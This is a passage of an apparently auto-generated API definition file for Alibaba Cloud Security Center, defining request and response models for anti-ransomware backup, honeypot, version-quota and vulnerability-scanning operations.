  database?: string(name='Database', description='The name of the database.', example='msdb', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  policyId: long(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='123', position='Query'),
}

model DescribeUniRecoverableListResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  database?: string(name='Database', description='The name of the database.', example='msdb'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  recoverableInfoList?: [ 
    {
      firstTime?: long(name='FirstTime', description='The timestamp of the first backup. Unit: milliseconds.', example='1671468180000'),
      lastTime?: long(name='LastTime', description='The timestamp of the last backup. Unit: milliseconds.', example='1671468180000'),
      resetScn?: string(name='ResetScn', description='The identifier of the point in time for restoration in the backup version that is used. The database is an Oracle database.', example='4529940.0'),
      resetTime?: long(name='ResetTime', description='The point in time for restoration in the backup version that is used. The database is an Oracle database.', example='2021-01-30 08:04:36'),
      restoreInfo?: string(name='RestoreInfo', description='The information about the database. This parameter is available when the database is a Microsoft SQL Server (MSSQL) database. The value is a JSON string. Valid values:

*   **name**: the name of the database
*   **files**: the path to the database files', example='{
      "files": {
            "qtc": "F:\\\\database\\\\qtc.mdf",
            "qtc_log": "F:\\\\database\\\\qtc_0.ldf"
      },
      "name": "qtc"
}'),
    }
  ](name='RecoverableInfoList', description='An array that consists of the backup snapshots.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760****'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='23'),
}

model DescribeUniRecoverableListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniRecoverableListResponseBody(name='body'),
}

async function describeUniRecoverableList(request: DescribeUniRecoverableListRequest): DescribeUniRecoverableListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeUniRecoverableList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeUniSupportRegionRequest {
}

model DescribeUniSupportRegionResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760****'),
  uniSupportRegion?: [ string ](name='UniSupportRegion', description='An array consisting of the region that is supported by anti-ransomware for databases.'),
}

model DescribeUniSupportRegionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniSupportRegionResponseBody(name='body'),
}

async function describeUniSupportRegion(request: DescribeUniSupportRegionRequest): DescribeUniSupportRegionResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeUniSupportRegion', 'POST', '/', 'json', false, 'json', request);
}

model DescribeUserBackupMachinesRequest {
}

model DescribeUserBackupMachinesResponseBody = {
  machines?: [ 
    {
      id?: long(name='Id', description='The ID of the anti-ransomware policy that is applied to the server.', example='123'),
      policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy that is applied to the server.', example='policy_name_A'),
      uuid?: string(name='Uuid', description='The UUID of the server to which the anti-ransomware policy is applied.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****'),
    }
  ](name='Machines', description='An array consisting of the servers to which the anti-ransomware policy is applied.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
}

model DescribeUserBackupMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUserBackupMachinesResponseBody(name='body'),
}

async function describeUserBackupMachines(request: DescribeUserBackupMachinesRequest): DescribeUserBackupMachinesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeUserBackupMachines', 'POST', '/', 'json', false, 'json', request);
}

model DescribeUserBaselineAuthorizationRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', description='资产所有者ID。', example='1519712934213764', position='Query'),
  sourceIp?: string(name='SourceIp', description='The ID of the asset owner.', example='1.2.3.4', position='Query'),
}

model DescribeUserBaselineAuthorizationResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='0AF20EB0-EBBC-4B94-9B84-F3BAFAC53EDE'),
  userBaselineAuthorization?: {
    status?: int32(name='Status', description='Indicates whether Security Center is authorized to run configuration checks on cloud services.

*   **0**: no. Security Center is not authorized to run configuration checks on cloud services.
*   **1**: yes. Security Center is authorized to run configuration checks on cloud services.', example='1'),
  }(name='UserBaselineAuthorization', description='The information about whether Security Center is authorized to run configuration checks on cloud services.'),
}

model DescribeUserBaselineAuthorizationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUserBaselineAuthorizationResponseBody(name='body'),
}

async function describeUserBaselineAuthorization(request: DescribeUserBaselineAuthorizationRequest): DescribeUserBaselineAuthorizationResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeUserBaselineAuthorization', 'POST', '/', 'json', false, 'json', request);
}

model DescribeUserLayoutAuthorizationRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:
- **zh**: Chinese
- **en**: English', example='zh', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.3.4', position='Query'),
}

model DescribeUserLayoutAuthorizationResponseBody = {
  authorized?: boolean(name='Authorized', description='The result of the query. Valid values:
- **true**: The brute-force attacks protection feature has been authorized.
- **false**: The brute-force attacks protection feature is not authorized.', example='false'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='4A80EE8F-2175-49DA-B8BF-FAE1B3D52E4C'),
}

model DescribeUserLayoutAuthorizationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUserLayoutAuthorizationResponseBody(name='body'),
}

async function describeUserLayoutAuthorization(request: DescribeUserLayoutAuthorizationRequest): DescribeUserLayoutAuthorizationResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeUserLayoutAuthorization', 'POST', '/', 'json', false, 'json', request);
}

model DescribeUuidsByVulNamesRequest {
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is fixed. Valid values:

*   **y**: the vulnerability is fixed.
*   **n**: the vulnerability is not fixed.', example='n', position='Query'),
  fieldName?: string(name='FieldName', description='The name of the search field that is used to query containers.', example='namespace', position='Query'),
  fieldValue?: string(name='FieldValue', description='The value of the search field that is used to query containers.', example='cas-adad-qeqwe', position='Query'),
  groupId?: long(name='GroupId', description='The ID of the asset group.', example='11286014', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  level?: string(name='Level', description='The severity of the vulnerability. Separate multiple severities with commas (,). Valid values:

*   **high**
*   **medium**
*   **low**', example='high,low', position='Query'),
  necessity?: string(name='Necessity', description='The priority based on which the vulnerability is fixed. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap,later,nntf', position='Query'),
  remark?: string(name='Remark', description='The remarks for the asset affected by the vulnerability. The value can be the private IP address, public IP address, or name of the asset. Fuzzy match is supported.', example='10.7.', position='Query'),
  searchTags?: string(name='SearchTags', description='The tags that are used to search for the vulnerability.', example='oval', position='Query'),
  statusList?: string(name='StatusList', description='The status of the vulnerability. Separate multiple states with commas (,). Valid values:

*   **1**: unfixed
*   **2**: fix failed', example='1,4', position='Query'),
  tag?: string(name='Tag', description='The tag of the vulnerability.', example='oval', position='Query'),
  targetType?: string(name='TargetType', description='The type of the query condition. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the ID of the asset', example='uuid', position='Query'),
  type: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability', example='cve', position='Query'),
  vpcInstanceIds?: string(name='VpcInstanceIds', description='The ID of the virtual private cloud (VPC) in which the vulnerability is detected. Separate multiple IDs with commas (,).', example='vpc-uf6ssrvbrwe37ekw****,vpc-bp1aevy8sofi8mh1q****', position='Query'),
  vulNames: [ string ](name='VulNames', description='An array that consists of the names of vulnerabilities.

>  You can call the [DescribeGroupedVul](~~DescribeGroupedVul~~) operation to obtain the names of vulnerabilities.', position='Query'),
}

model DescribeUuidsByVulNamesResponseBody = {
  machineInfoStatistics?: [ 
    {
      machineInstanceId?: string(name='MachineInstanceId', description='The instance ID.', example='i-wz9gd1os5talju****'),
      machineIp?: string(name='MachineIp', description='The IP address of the server.', example='192.168.XX.XX'),
      machineName?: string(name='MachineName', description='The name of the server.', example='TestMachine'),
      os?: string(name='Os', description='The operating system that the server runs.', example='windows'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-hangzhou'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='18375c64-eaa2-4702-92b0-4ee7******'),
    }
  ](name='MachineInfoStatistics', description='An array that consists of the statistics about the assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='97286A-4A6B-4A4-95FA-EC7E3E2451'),
  vulCount?: int32(name='VulCount', description='The total number of vulnerabilities on the server.', example='2'),
}

model DescribeUuidsByVulNamesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUuidsByVulNamesResponseBody(name='body'),
}

async function describeUuidsByVulNames(request: DescribeUuidsByVulNamesRequest): DescribeUuidsByVulNamesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeUuidsByVulNames', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVendorListRequest {
}

model DescribeVendorListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='340D7FC4-D575-1661-8ACD-CFA7BE57B795'),
  vendorNameList?: [ string ](name='VendorNameList', description='An array that consists of the service providers.'),
}

model DescribeVendorListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVendorListResponseBody(name='body'),
}

async function describeVendorList(request: DescribeVendorListRequest): DescribeVendorListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVendorList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVersionConfigRequest {
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId', description='The ID of the Alibaba Cloud account that uses Security Center.

>  You can call the [GetUser](~~28681~~) operation to query the IDs of Alibaba Cloud accounts.', example='127608589417****', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.0.XX.XX', position='Query'),
}

model DescribeVersionConfigResponseBody = {
  agentlessCapacity?: long(name='AgentlessCapacity', description='The quota for agentless detection.

>  The agentless detection feature is unavailable for purchase. You can ignore this parameter.', example='10'),
  allowPartialBuy?: int32(name='AllowPartialBuy', description='Indicates whether the pay-as-you-go billing method is supported.

*   **0**: no
*   **1**: yes', example='1'),
  appWhiteList?: int32(name='AppWhiteList', description='Indicates whether the application whitelist feature is enabled. Valid values:

*   **0**: no
*   **2**: yes', example='2'),
  appWhiteListAuthCount?: long(name='AppWhiteListAuthCount', description='The quota for the application whitelist feature.

>  The quantity of servers that are allowed by the quota is deducted by one each time you apply an application whitelist to a server. After you enable the application whitelist feature, the quota is 20 by default.', example='20'),
  assetLevel?: int32(name='AssetLevel', description='The quota for servers that can be protected.', example='30'),
  cspmCapacity?: long(name='CspmCapacity', description='The quota for configuration assessment. Unit: times/month.', example='10'),
  highestVersion?: int32(name='HighestVersion', description='The most advanced edition that is used. Valid values:

*   **1**: Basic edition
*   **3**: Enterprise edition
*   **5**: Advanced edition
*   **6**: Anti-virus edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition

>  If you purchase the Multi-version edition of Security Center, the value indicates the most advanced edition that is used in the Multi-version edition. If you do not purchase the Multi-version edition of Security Center, the value indicates the edition of Security Center.', example='1'),
  honeypotCapacity?: long(name='HoneypotCapacity', description='The number of honeypots.', example='20'),
  imageScanCapacity?: long(name='ImageScanCapacity', description='The quota for the container image scan feature.', example='8954'),
  instanceId?: string(name='InstanceId', description='The ID of purchased Security Center.', example='sas-vg6hafdsafs****'),
  isNewContainerVersion?: boolean(name='IsNewContainerVersion', description='Indicates whether Security Center runs the latest version of the Ultimate edition.

*   **true**: yes
*   **false**: no', example='true'),
  isNewMultiVersion?: boolean(name='IsNewMultiVersion', description='Indicates whether Security Center runs the latest version of the Multi-version edition. Valid values:

*   **true**
*   **false**', example='true'),
  isOverBalance?: boolean(name='IsOverBalance', description='Indicates whether the number of existing servers exceeds the purchased quota. Valid values:

*   **false**: no
*   **true**: yes', example='false'),
  isPostpay?: boolean(name='IsPostpay'),
  isTrialVersion?: int32(name='IsTrialVersion', description='Indicates whether Security Center runs the free trial edition. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
  lastTrailEndTime?: long(name='LastTrailEndTime', description='The timestamp when the last trial ends. Unit: milliseconds.', example='1603934844000'),
  MVAuthCount?: int32(name='MVAuthCount', description='The total quota in the Multi-version edition of purchased Security Center.', example='5000'),
  MVUnusedAuthCount?: int32(name='MVUnusedAuthCount', description='The total remaining quota in the Multi-version edition of purchased Security Center.', example='40'),
  openTime?: long(name='OpenTime', description='The timestamp when Security Center is purchased. Unit: milliseconds.', example='1657244824669'),
  postPayInstanceId?: string(name='PostPayInstanceId'),
  postPayModuleSwitch?: string(name='PostPayModuleSwitch'),
  postPayOpenTime?: long(name='PostPayOpenTime'),
  postPayStatus?: int32(name='PostPayStatus'),
  raspCapacity?: long(name='RaspCapacity', description='The quota for application protection. Unit: process/month.', example='10'),
  releaseTime?: long(name='ReleaseTime', description='The timestamp when Security Center is released. Unit: milliseconds. The value of this parameter is seven days after Security Center expires.

> If you do not renew the subscription within seven days after the expiration date, the Value-added Plan, Basic Anti-Virus, Advanced, or Enterprise edition is downgraded to the Basic edition. In this case, you can no longer view the existing configurations or statistics such as DDoS alerts. You must purchase the Anti-virus, Advanced, or Enterprise edition to continue using relevant features. For more information, see [Purchase Security Center](~~42308~~).', example='1625846400000'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='C2DC96D2-DD2E-49D9-A28E-85590475DF55'),
  sasLog?: int32(name='SasLog', description='Indicates whether log analysis is purchased. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  sasScreen?: int32(name='SasScreen', description='Indicates whether the security screen feature is purchased. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
  slsCapacity?: long(name='SlsCapacity', description='The log storage capacity that you purchase. Unit: GB. Valid values: 0 to 200000.', example='10240'),
  threatAnalysisCapacity?: long(name='ThreatAnalysisCapacity', description='The purchased log storage capacity for threat analysis. Unit: GB.', example='25'),
  userDefinedAlarms?: int32(name='UserDefinedAlarms', description='Indicates whether the custom alert feature is enabled. Valid values:

*   **0**: no
*   **2**: yes', example='0'),
  version?: int32(name='Version', description='The edition of purchased Security Center. Valid values:

*   **1**: Basic edition
*   **3**: Enterprise edition
*   **5**: Advanced edition
*   **6**: Anti-virus edition
*   **7**: Ultimate edition
*   **8**: Multi-version edition
*   **10**: Value-added Plan edition', example='3'),
  vmCores?: int32(name='VmCores', description='The quota for the cores of servers that can be protected.', example='10'),
  vulFixCapacity?: long(name='VulFixCapacity', description='The quota for vulnerability fixing. Unit: times/month.', example='10'),
  webLock?: int32(name='WebLock', description='Indicates whether the web tamper proofing feature is enabled. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
  webLockAuthCount?: long(name='WebLockAuthCount', description='The quota for the web tamper proofing feature. The quantity of servers that are allowed by the quota is deducted by one each time a server is protected by the web tamper proofing feature. Valid values: 0 to N.

>  N indicates the number of servers that you own.', example='0'),
}

model DescribeVersionConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVersionConfigResponseBody(name='body'),
}

async function describeVersionConfig(request: DescribeVersionConfigRequest): DescribeVersionConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVersionConfig', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVpcHoneyPotCriteriaRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh', position='Query'),
}

model DescribeVpcHoneyPotCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the search condition.', example='vpcRegionId'),
      type?: string(name='Type', description='The type of the search condition. Valid values:

*   **input**: You must manually enter the search condition.
*   **select**: You must select a search condition from the **Values** drop-down list.', example='select'),
      values?: string(name='Values', description='The values of the search condition. This parameter is returned only if the value of **Type** is **select**.

> If the value of **Type** is **input**, the value of this parameter is an empty string.', example='ap-southeast-2,eu-west-1'),
    }
  ](name='CriteriaList', description='An array that consists of the search conditions.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FCE38ADB-7361-4212-AD87-A4514E4DF925'),
}

model DescribeVpcHoneyPotCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVpcHoneyPotCriteriaResponseBody(name='body'),
}

async function describeVpcHoneyPotCriteria(request: DescribeVpcHoneyPotCriteriaRequest): DescribeVpcHoneyPotCriteriaResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVpcHoneyPotCriteria', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVpcHoneyPotListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='2', position='Query'),
  honeyPotExistence?: boolean(name='HoneyPotExistence', description='Specifies whether the cloud honeypot feature is enabled for the VPCs. Valid values:

*   **true**: yes
*   **false**: no', example='true', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  vpcId?: string(name='VpcId', description='The ID of the VPC on which the honeypot is deployed.

> You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to query the IDs of VPCs.', example='vpc-d7o009q63fqy21r8u****', position='Query'),
  vpcName?: string(name='VpcName', description='The name of the VPC.

> You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to query the names of VPCs.', example='abcnet', position='Query'),
  vpcRegionId?: string(name='VpcRegionId', description='The region ID of the VPC.

> You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to query the region IDs of VPCs.', example='ap-southeast-2', position='Query'),
}

model DescribeVpcHoneyPotListResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='4FEC7F58-FCDA-415F-AE25-CD8BC0931DF2'),
  vpcHoneyPotDTOList?: [ 
    {
      cidrBlock?: string(name='CidrBlock', description='The CIDR block of the VPC.', example='192.168.XX.XX/16'),
      createTime?: long(name='CreateTime', description='The time at which the VPC was created. Unit: milliseconds.', example='1607365213000'),
      honeyPotEcsInstanceStatus?: string(name='HoneyPotEcsInstanceStatus', description='The status of the server on which the honeypot is deployed. Valid values:

*   **Pending**: The server is being created.
*   **Running**: The server is running.
*   **Starting**: The server is being started.
*   **Stopping**: The server is being stopped.
*   **Stopped**: The server is stopped.', example='Running'),
      honeyPotEniInstanceId?: string(name='HoneyPotEniInstanceId', description='The ID of the elastic network interface (ENI) used by the honeypot in the VPC.', example='eni-p0whwgg7bing8b80****'),
      honeyPotExistence?: boolean(name='HoneyPotExistence', description='Indicates whether the cloud honeypot feature is enabled for the VPC. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      honeyPotInstanceStatus?: string(name='HoneyPotInstanceStatus', description='The status of the honeypot. Valid values:

*   **pending**: The honeypot is being created.
*   **deleting**: The honeypot is being deleted.
*   **off**: The honeypot is disabled.
*   **suspending**: The honeypot is suspended.
*   **on**: The honeypot is enabled.', example='on'),
      honeyPotVpcSwitchId?: string(name='HoneyPotVpcSwitchId', description='The ID of the vSwitch to which the ENI used by the honeypot is connected.', example='vsw-p0w7gdcfvn20tvdul****'),
      vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-p0w223apdl49sr5zv****'),
      vpcName?: string(name='VpcName', description='The name of the VPC.', example='abc-vpcname'),
      vpcRegionId?: string(name='VpcRegionId', description='The region ID of the VPC.

> For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='ap-southeast-2'),
      vpcStatus?: string(name='VpcStatus', description='The status of the VPC. Valid values:

*   **Available**: The VPC is normal and available.
*   **Pending**: The VPC is being configured.', example='Available'),
      vpcSwitchIdList?: [ 
        {
          vpcSwitchId?: string(name='VpcSwitchId', description='The ID of the vSwitch.', example='vsw-p0wdnyv4wzp6jkuu4****'),
          vpcSwitchName?: string(name='VpcSwitchName', description='The name of the vSwitch.', example='abc01'),
          zoneId?: string(name='ZoneId', description='The zone ID of the vSwitch.', example='ap-southeast-2b'),
        }
      ](name='VpcSwitchIdList', description='An array that consists of the vSwitches in the VPC.'),
    }
  ](name='VpcHoneyPotDTOList', description='An array that consists of the honeypots.'),
}

model DescribeVpcHoneyPotListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVpcHoneyPotListResponseBody(name='body'),
}

/**
  * If you specify only the Action request parameter in your request, Security Center returns the list of all VPCs regardless of whether a honeypot is deployed on a VPC.
  *
 */
async function describeVpcHoneyPotList(request: DescribeVpcHoneyPotListRequest): DescribeVpcHoneyPotListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVpcHoneyPotList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVpcListRequest {
}

model DescribeVpcListResponseBody = {
  count?: int32(name='Count', description='The total number of entries returned.', example='1'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  vpcList?: [ 
    {
      ecsCount?: int32(name='EcsCount', description='The number of Elastic Compute Service (ECS) instances.', example='9'),
      instanceDesc?: string(name='InstanceDesc', description='The information about the virtual private cloud (VPC).', example='TestVpcNote'),
      instanceId?: string(name='InstanceId', description='The ID of the ECS instance.', example='ins_1321_asedb_ada'),
      instanceName?: string(name='InstanceName', description='The name of the VPC.', example='test'),
      regionId?: string(name='RegionId', description='The region in which the server resides.', example='cn-hangzhou'),
    }
  ](name='VpcList', description='An array that consists of VPCs.'),
}

model DescribeVpcListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVpcListResponseBody(name='body'),
}

async function describeVpcList(request: DescribeVpcListRequest): DescribeVpcListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVpcList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVulCheckTaskStatusDetailRequest {
  taskIds?: [ string ](name='TaskIds', description='The IDs of tasks.', position='Query'),
  types?: [ string ](name='Types', description='The types of the vulnerabilities that are detected by the tasks.', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='5d55af3c-35f3-4d4d-8ccc-8c5443b0****', position='Query'),
}

model DescribeVulCheckTaskStatusDetailResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  taskStatuses?: [ 
    {
      taskId?: string(name='TaskId', description='The ID of the main task.', example='16190385'),
      taskStatusList?: [ 
        {
          code?: string(name='Code', description='The error code returned.', example='push_command_failed'),
          status?: string(name='Status', description='The status of the subtask. Valid values:

*   **0**: unhandled
*   **1**: collecting
*   **2**: collected
*   **3**: matching
*   **4**: complete', example='4'),
          type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **sca**: vulnerability that is detected based on software component analysis', example='cve'),
        }
      ](name='TaskStatusList', description='An array that consists of status information about the vulnerability scan subtask.'),
    }
  ](name='TaskStatuses', description='An array that consists of the status information about the vulnerability scan tasks on the server.'),
  totalCount?: int32(name='TotalCount', description='The total number of vulnerability scan tasks on the server.', example='1'),
}

model DescribeVulCheckTaskStatusDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulCheckTaskStatusDetailResponseBody(name='body'),
}

async function describeVulCheckTaskStatusDetail(request: DescribeVulCheckTaskStatusDetailRequest): DescribeVulCheckTaskStatusDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVulCheckTaskStatusDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVulConfigRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='113.110.XX.XX', position='Query'),
  type?: string(name='Type', description='The type of configuration. By default, all types of configurations are queried. Valid values:

*   **cve**: Linux software vulnerability.
*   **sys**: Windows system vulnerability.
*   **cms**: Web-CMS vulnerability.
*   **app**: application vulnerability that is detected by using web scanner.
*   **emg**: urgent vulnerability.
*   **scanMode**: displays easily exploitable vulnerability.
*   **imageVulClean**: vulnerability retention duration.
*   **yum**: preferentially uses YUM or APT sources of Alibaba Cloud to fix vulnerabilities.', example='cve', position='Query'),
}

model DescribeVulConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
  targetConfigs?: [ 
    {
      config?: string(name='Config', description='The configuration of vulnerability scan.

> Valid values when you set the Type parameter to **cve**, **sys**, **cms**, **app**, **emg**, or **yum**:

*   **on**: enabled

*   **off**: disabled

Valid values when you set the Type parameter to **scanMode**:

*   **real**: displays easily exploitable vulnerability.

*   **all**: displays all vulnerabilities.

When you set the Type parameter to **imageVulClean**, the value of this parameter indicates the vulnerability retention period in days.', example='90'),
      overAllConfig?: string(name='OverAllConfig', description='Indicates whether the vulnerability management feature is enabled for all servers. Valid values:

*   **off**: disabled
*   **on**: enabled', example='on'),
      type?: string(name='Type', description='The type of configuration. Valid values:

*   **cve**: Linux software vulnerability.
*   **sys**: Windows system vulnerability.
*   **cms**: Web-CMS vulnerability.
*   **app**: application vulnerability that is detected by using web scanner.
*   **emg**: urgent vulnerability.
*   **scanMode**: displays easily exploitable vulnerability.
*   **imageVulClean**: vulnerability retention duration.
*   **yum**: preferentially uses YUM or APT sources of Alibaba Cloud to fix vulnerabilities.', example='cve'),
    }
  ](name='TargetConfigs', description='An array that consists of the configurations of vulnerability management.'),
  totalCount?: int32(name='TotalCount', description='The total number of configurations.', example='10'),
}

model DescribeVulConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVulConfigResponseBody(name='body'),
}

async function describeVulConfig(request: DescribeVulConfigRequest): DescribeVulConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeVulConfig', 'POST', '/', 'json', false, 'json', request);
}

model DescribeVulDetailsRequest {
  aliasName?: string(name='AliasName', description='The vulnerability announcement.', example='RHSA-2019:3197-Important: sudo security update', position='Query'),
  lang: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  name: string(name='Name', description='The name of the vulnerability.

> You can call the [DescribeGroupedVul](~~DescribeGroupedVul~~) or [DescribeVulList](~~DescribeVulList~~) operation to query the names of vulnerabilities.', example='SCA:ACSV-2020-052801', position='Query'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='127608589417****', position='Query'),
  type: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerabilitiy
*   **emg**: urgent vulnerability
*   **sca**: vulnerability that is detected based on software component analysis', example='sca', position='Query'),
}

model DescribeVulDetailsResponseBody = {
  cves?: [ 
    {
      classify?: string(name='Classify', description='The type of the vulnerability.', example='remote_code_execution'),
      classifys?: [ 
        {
          classify?: string(name='Classify', description='The type of the vulnerability.', example='remote_code_execution'),
          demoVideoUrl?: string(name='DemoVideoUrl', description='The URL of the demo video for the vulnerability.', example='https://example.com'),
          description?: string(name='Description', description='The description of the vulnerability type.', example='Remote code execution'),
        }
      ](name='Classifys', description='The vulnerability types.'),
      cnvdId?: string(name='CnvdId', description='The China National Vulnerability Database (CNVD) ID.', example='CNVD-2019-9167'),
      complexity?: string(name='Complexity', description='The difficulty level of exploiting the vulnerability. Valid value:

*   **LOW**
*   **MEDIUM**
*   **HIGH**', example='LOW'),
